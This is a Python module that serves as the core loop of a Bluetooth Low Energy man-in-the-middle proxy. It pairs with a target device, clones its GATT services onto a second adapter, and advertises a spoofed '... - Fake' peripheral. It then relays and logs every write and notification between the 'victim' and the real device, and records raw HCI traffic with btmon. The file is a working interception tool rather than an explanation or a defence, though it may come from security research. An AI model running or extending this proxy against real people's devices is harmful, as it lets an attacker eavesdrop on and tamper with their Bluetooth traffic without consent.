"""
Core proxy loop.

Connects to the target BLE device (central role), mirrors its full GATT profile
as a peripheral on a second adapter, then bridges:
  - Writes from the victim → forwarded to the real device via bleak_client
  - Notifications from the real device → pushed to the victim via DBus signals
"""
import asyncio
import logging
import signal
import threading

import dbus
import dbus.mainloop.glib
from gi.repository import GLib
from bleak import BleakClient, BleakScanner

import state
from constants import (
    BLUEZ_SERVICE, LE_ADV_MANAGER, GATT_MANAGER_IFACE,
    AGENT_MANAGER_IFACE, AGENT_PATH, DBUS_OM_IFACE,
    BLUEZ_RESERVED_SERVICES,
)
from logger import log_event
from agent import SimpleAgent
from advertisement import BLEAdvertisement
from gatt import BLEApplication, BLEService, BLECharacteristic, BLEDescriptor
from enumeration import enumerate_services
from victim_monitor import setup_victim_monitoring

log = logging.getLogger(__name__)


async def run_proxy(target_mac: str, central_adapter: str, peripheral_adapter: str) -> None:
    state.log_file = open(f"logs/mitm_{target_mac.replace(':', '')}.log", "w")
    state.asyncio_loop = asyncio.get_event_loop()

    log.info("Put the device in pairing mode (long-press the channel button), then press Enter...")
    await asyncio.get_event_loop().run_in_executor(None, input)

    # Remove any stale pairing so BlueZ will re-pair cleanly
    proc = await asyncio.create_subprocess_exec(
        "bluetoothctl", "remove", target_mac,
        stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL,
    )
    await proc.wait()

    log.info(f"Scanning for {target_mac} on {central_adapter}...")
    device = await BleakScanner.find_device_by_address(
        target_mac, timeout=15.0, bluez={"adapter": central_adapter}
    )
    if not device:
        log.error("Target not found. Is it advertising?")
        return
    log.info(f"Found: {device.name} [{device.address}]")

    # Set up GLib/DBus and pairing agent BEFORE connecting so they are ready
    # when pair=True triggers the Just Works handshake inside BleakClient.connect()
    dbus.mainloop.glib.DBusGMainLoop(set_as_default=True)
    bus = dbus.SystemBus()

    stop_event = asyncio.Event()
    glib_loop = GLib.MainLoop()
    GLib.unix_signal_add(
        GLib.PRIORITY_HIGH, signal.SIGINT,
        lambda: (glib_loop.quit(), state.asyncio_loop.call_soon_threadsafe(stop_event.set)),
    )
    glib_thread = threading.Thread(target=glib_loop.run, daemon=True)
    glib_thread.start()

    SimpleAgent(bus)
    agent_manager = dbus.Interface(bus.get_object(BLUEZ_SERVICE, "/org/bluez"), AGENT_MANAGER_IFACE)
    agent_manager.RegisterAgent(AGENT_PATH, "NoInputNoOutput")
    agent_manager.RequestDefaultAgent(AGENT_PATH)
    log.info("Pairing agent registered.")

    def on_disconnect(_):
        log.warning("Disconnected from real device!")
        state.asyncio_loop.call_soon_threadsafe(stop_event.set)

    async with BleakClient(
        device,
        bluez={"adapter": central_adapter},
        timeout=30.0,
        disconnected_callback=on_disconnect,
        pair=True,
    ) as client:
        state.bleak_client = client
        log.info("Connected. Enumerating services...")

        enum = await enumerate_services(client)
        enum.device_name = f"{device.name or 'BLE Device'} - Fake"

        # Verify the peripheral adapter supports GATT and LE advertising
        adapter_path = f"/org/bluez/{peripheral_adapter}"
        adapter_obj = bus.get_object(BLUEZ_SERVICE, adapter_path)
        managed = dbus.Interface(bus.get_object(BLUEZ_SERVICE, "/"), DBUS_OM_IFACE).GetManagedObjects()
        adapter_ifaces = managed.get(adapter_path, {})
        if GATT_MANAGER_IFACE not in adapter_ifaces:
            log.error(f"Adapter {peripheral_adapter} is missing {GATT_MANAGER_IFACE}")
            return
        if LE_ADV_MANAGER not in adapter_ifaces:
            log.error(f"Adapter {peripheral_adapter} is missing {LE_ADV_MANAGER}")
            return

        adv_manager  = dbus.Interface(adapter_obj, LE_ADV_MANAGER)
        gatt_manager = dbus.Interface(adapter_obj, GATT_MANAGER_IFACE)

        app = BLEApplication(bus)
        adv = BLEAdvertisement(bus, 0, enum.device_name)

        # Build the mirrored GATT tree, skipping BlueZ-reserved services
        char_objects: dict[int, BLECharacteristic] = {}
        svc_dbus_idx = 0
        for svc_info in enum.services:
            if svc_info.uuid in BLUEZ_RESERVED_SERVICES:
                log.debug(f"Skipping BlueZ-reserved service {svc_info.uuid}")
                continue
            dbus_svc = BLEService(bus, svc_dbus_idx, svc_info.uuid)
            svc_dbus_idx += 1
            for char_idx, char_info in enumerate(svc_info.chars):
                dbus_char = BLECharacteristic(
                    bus, char_idx, char_info.uuid, char_info.flags,
                    dbus_svc.path, handle=char_info.handle,
                )
                state.char_values[char_info.handle] = char_info.initial_value
                # Prefer write-without-response when available; fall back to write-with-response
                can_write_req = "write" in char_info.flags
                can_write_cmd = "write-without-response" in char_info.flags
                state.char_write_prefers_response[char_info.handle] = can_write_req and not can_write_cmd
                for desc_idx, (desc_uuid, desc_flags) in enumerate(char_info.descriptors):
                    dbus_char.add_descriptor(BLEDescriptor(bus, desc_idx, desc_uuid, desc_flags, dbus_char.path))
                char_objects[char_info.handle] = dbus_char
                dbus_svc.add_characteristic(dbus_char)
            app.add_service(dbus_svc)

        gatt_opts = dbus.Dictionary({}, signature="sv")
        adv_opts  = dbus.Dictionary({}, signature="sv")

        def _on_adv_ok():
            log.info(f"Advertising as '{enum.device_name}' on {peripheral_adapter} — ready!")

        def _on_adv_err(e):
            log.error(f"Advertising error: {e}")

        def _on_gatt_ok():
            log.info("GATT app registered")
            adv_manager.RegisterAdvertisement(
                adv.get_path(), adv_opts,
                reply_handler=_on_adv_ok, error_handler=_on_adv_err,
            )

        def _on_gatt_err(e):
            log.error(f"GATT error: {e}")

        # Capture raw HCI/ATT events on the peripheral adapter for post-mortem inspection
        btmon_log_path = f"logs/btmon_{peripheral_adapter}.log"
        btmon_proc = None
        try:
            btmon_log_fh = open(btmon_log_path, "w")
            btmon_proc = await asyncio.create_subprocess_exec(
                "btmon", "-i", peripheral_adapter,
                stdout=btmon_log_fh, stderr=btmon_log_fh,
            )
            log.info(f"btmon started — raw HCI log: {btmon_log_path}")
        except Exception as e:
            log.warning(f"Could not start btmon: {e}")

        gatt_manager.RegisterApplication(
            app.path, gatt_opts,
            reply_handler=_on_gatt_ok, error_handler=_on_gatt_err,
        )
        setup_victim_monitoring(bus, peripheral_adapter)

        # Subscribe to notifications/indications on the real device and relay them to the victim
        log.info("Subscribing to notifications...")
        for svc in client.services:
            for char in svc.characteristics:
                if not {"notify", "indicate"}.intersection(char.properties):
                    continue
                handle = char.handle
                if handle not in char_objects:
                    continue
                dbus_char = char_objects[handle]

                def make_handler(h=handle, u=str(char.uuid), dc=dbus_char):
                    def handler(_, data: bytearray):
                        state.char_values[h] = data
                        log_event("NOTF", u, data)
                        dc.notify(data)
                    return handler

                try:
                    await client.start_notify(char, make_handler())
                except Exception as e:
                    log.warning(f"Could not subscribe to {char.uuid} (handle {handle}): {e}")

        await stop_event.wait()
        glib_loop.quit()
        glib_thread.join(timeout=2)

        if btmon_proc is not None and btmon_proc.returncode is None:
            btmon_proc.terminate()
            try:
                await asyncio.wait_for(btmon_proc.wait(), timeout=2)
            except asyncio.TimeoutError:
                btmon_proc.kill()

    state.log_file.close()
